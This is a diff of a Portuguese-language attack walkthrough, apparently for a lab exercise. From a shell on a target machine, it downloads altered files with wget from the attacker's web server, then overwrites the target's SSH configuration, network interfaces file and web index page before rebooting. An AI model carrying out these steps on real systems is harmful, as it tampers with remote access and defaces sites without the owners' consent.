@@ -16,15 +16,15 @@ Após rodar os dois e fazer as devidas modificações nos documentos, vamos dar 
     No Kali, por exemplo, essa pasta é /var/www/html
     
   Feito isso, no cmd que recebemos, vamos dar o comando:
-    "wget "http://localhost/arquivo1" -O arquivo1alterado"
-    "wget "http://localhost/arquivo2" -O arquivo2alterado"
-    "wget "http://localhost/arquivo3" -O arquivo3alterado"
+    "wget "http://localhost/sshd_config" -O arquivo1alterado"
+    "wget "http://localhost/interfaces" -O arquivo2alterado"
+    "wget "http://localhost/index.html" -O arquivo3alterado"
     
   Com isso, já vamos ter os arquivos alterados na máquina alvo.
   Para substituir os arquivos originais pelos arquivos alterados, damos o seguinte comando:
-    "mv arquivo1alterado arquivo1"
-    "mv arquivo2alterado arquivo2"
-    "mv arquivo3alterado arquivo3"
+    "mv arquivo1alterado /etc/ssh/sshd_config"
+    "mv arquivo2alterado /etc/network/interfaces"
+    "mv arquivo3alterado /var/www/html/index.html"
     
   Agora os arquivos estão substituídos, vamos dar o comando para reiniciar a máquina alvo para concluir as alterações
     "reboot"
